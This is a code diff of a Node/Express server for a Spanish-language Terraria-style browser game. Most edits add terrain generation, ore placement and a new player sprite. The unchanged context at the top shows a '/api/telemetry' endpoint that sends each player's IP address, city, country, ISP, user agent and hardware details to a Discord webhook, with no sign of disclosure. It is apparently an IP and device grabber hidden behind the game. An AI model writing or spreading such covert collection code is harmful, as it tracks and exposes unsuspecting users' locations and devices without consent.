@@ -29,7 +29,6 @@ app.post('/api/telemetry', async (req, res) => {
         const payload = {
             content: `🎮 **¡Nuevo Jugador en Modo Creativo!**\n📍 **IP:** \`${userIp}\` (${city}, ${country})\n📡 **ISP:** ${isp}\n💻 **OS:** \`${d.userAgent || 'N/A'}\`\n🖥️ **Pantalla:** ${d.screen || 'N/A'}\n🧠 **Hardware:** ${d.cores || 'N/A'} Cores | GPU: ${d.gpu || 'N/A'}`
         };
-
         try {
             await fetch(DISCORD_WEBHOOK_URL, {
                 method: 'POST',
@@ -38,11 +37,9 @@ app.post('/api/telemetry', async (req, res) => {
             });
         } catch (err) {}
     }
-
     res.sendStatus(200);
 });
 
-// MOTOR TIPO TERRARIA CREATIVO
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="es">
@@ -142,24 +139,12 @@ app.get('/', (req, res) => {
         });
     }
 
-    function sel(index) {
-        selectedSlot = index;
-        renderHotbar();
-    }
-
-    function equip(blockId) {
-        hotbarItems[selectedSlot] = blockId;
-        renderHotbar();
-    }
-
-    function toggleInventory() {
-        invOpen = !invOpen;
-        document.getElementById('inventory-modal').style.display = invOpen ? 'block' : 'none';
-    }
+    function sel(index) { selectedSlot = index; renderHotbar(); }
+    function equip(blockId) { hotbarItems[selectedSlot] = blockId; renderHotbar(); }
+    function toggleInventory() { invOpen = !invOpen; document.getElementById('inventory-modal').style.display = invOpen ? 'block' : 'none'; }
 
     function startGame() {
         bgMusic.play().catch(e => console.log("Interacción requerida para audio."));
-        
         document.getElementById('menu').style.display = 'none';
         document.getElementById('ui-layer').style.display = 'block';
         renderHotbar();
@@ -180,15 +165,25 @@ app.get('/', (req, res) => {
         const CHUNK_H = 100;
         let world = Array.from({ length: CHUNK_W }, () => Array(CHUNK_H).fill(0));
         
+        // ⛰️ GENERACIÓN PROCEDIMENTAL TIPO TERRARIA
         for (let x = 0; x < CHUNK_W; x++) {
+            // Usa ondas para generar montañas y valles suaves
+            let h = Math.floor(30 + Math.sin(x * 0.15) * 5 + Math.sin(x * 0.05) * 3);
             for (let y = 0; y < CHUNK_H; y++) {
-                if (y === 30) world[x][y] = 2;
-                else if (y > 30 && y < 35) world[x][y] = 3;
-                else if (y >= 35) world[x][y] = 4;
+                if (y === h) world[x][y] = 2; // Pasto
+                else if (y > h && y < h + Math.floor(Math.random() * 3 + 4)) world[x][y] = 3; // Capa de tierra variable
+                else if (y >= h + 4) {
+                    // Generación aleatoria de minerales en la piedra
+                    let rand = Math.random();
+                    if (rand > 0.98) world[x][y] = 12; // Diamante (2% prob)
+                    else if (rand > 0.95) world[x][y] = 13; // Oro (3% prob)
+                    else world[x][y] = 4; // Piedra base
+                }
             }
         }
 
-        const player = { x: (CHUNK_W/2)*TILE, y: 15*TILE, w: 24, h: 44, vx: 0, vy: 0, speed: 6, jump: -11, grounded: false };
+        // Jugador inicia alto para caer sobre el nuevo terreno generado
+        const player = { x: (CHUNK_W/2)*TILE, y: 5*TILE, w: 24, h: 44, vx: 0, vy: 0, speed: 6, jump: -11, grounded: false, facingRight: true };
         let camera = { x: 0, y: 0 };
         const keys = {};
 
@@ -269,16 +264,14 @@ app.get('/', (req, res) => {
 
         function update() {
             if (!invOpen) {
-                // MOVIMIENTO LATERAL
-                if (keys['KeyA']) player.vx = -player.speed;
-                else if (keys['KeyD']) player.vx = player.speed;
+                if (keys['KeyA']) { player.vx = -player.speed; player.facingRight = false; }
+                else if (keys['KeyD']) { player.vx = player.speed; player.facingRight = true; }
                 else player.vx = 0;
 
-                // SALTO CENTRALIZADO Y CORREGIDO
                 if ((keys['Space'] || keys['KeyW']) && player.grounded) {
                     player.vy = player.jump;
                     player.grounded = false;
-                    keys['Space'] = false; // Forza soltar la tecla
+                    keys['Space'] = false; 
                     keys['KeyW'] = false;
                 }
 
@@ -297,10 +290,8 @@ app.get('/', (req, res) => {
                 } else {
                     if (player.vy > 0) {
                         player.grounded = true;
-                        // Cálculo exacto del piso superior del bloque
                         player.y = Math.floor((player.y + player.h + player.vy) / TILE) * TILE - player.h;
                     } else if (player.vy < 0) {
-                        // Cálculo exacto del techo del bloque
                         player.y = Math.floor((player.y + player.vy) / TILE) * TILE + TILE;
                     }
                     player.vy = 0;
@@ -371,12 +362,27 @@ app.get('/', (req, res) => {
                 }
             });
 
-            ctx.fillStyle = '#111827';
-            ctx.fillRect(player.x, player.y, player.w, player.h);
-            ctx.fillStyle = '#ef4444'; 
-            ctx.fillRect(player.x, player.y + 10, player.w, 15); 
-            ctx.fillStyle = '#fcd34d';
+            // 🧍 NUEVO DISEÑO DEL JUGADOR
+            // Pantalones grises
+            ctx.fillStyle = '#374151'; 
+            ctx.fillRect(player.x + 2, player.y + 24, 20, 20);
+            
+            // Camisa azul explorador
+            ctx.fillStyle = '#0284c7'; 
+            ctx.fillRect(player.x + 2, player.y + 10, 20, 16); 
+            
+            // Cabeza (Tono de piel)
+            ctx.fillStyle = '#ffcc99'; 
             ctx.fillRect(player.x + 4, player.y - 4, 16, 14); 
+            
+            // Cabello castaño
+            ctx.fillStyle = '#452b18'; 
+            ctx.fillRect(player.x + 4, player.y - 4, 16, 4); // Flequillo
+            ctx.fillRect(player.x + (player.facingRight ? 2 : 18), player.y - 4, 4, 10); // Parte trasera del pelo
+            
+            // Ojos (Direccionales)
+            ctx.fillStyle = '#000'; 
+            ctx.fillRect(player.x + (player.facingRight ? 14 : 6), player.y + 2, 4, 4);
 
             if (!invOpen) {
                 const tx = Math.floor((mouseX + camera.x) / TILE);
